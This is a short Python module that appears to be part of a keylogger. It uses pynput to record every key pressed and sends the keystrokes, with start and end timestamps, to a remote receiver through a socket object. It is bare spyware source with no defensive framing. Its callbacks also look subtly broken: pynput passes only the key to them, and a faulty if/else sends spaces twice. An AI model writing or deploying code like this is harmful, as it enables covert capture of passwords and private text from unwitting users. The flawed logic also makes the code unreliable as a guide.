from pynput import keyboard
import time

def run_on_press(key,sock):
    character=str(key).replace("'","")
    if key==keyboard.Key.space:
        sock.send_data(" ")
    if key==keyboard.Key.enter:
        sock.send_data("\n")
    else:
        sock.send_data(character)

def exit_condition(key,sock):
    if key==keyboard.Key.esc:
        Time=time.ctime(time.time())
        footer="\n------------------\n" + "Time of termination: " + str(Time)
        sock.send_data(footer)
        
def start_keylogger(sock):
    Time=time.ctime(time.time())
    header= "Time of initiation: " + str(Time) + "\n------------------\n"
    sock.send_data(header)
    with keyboard.Listener(on_press=run_on_press, on_release=exit_condition) as listener:
        listener.join()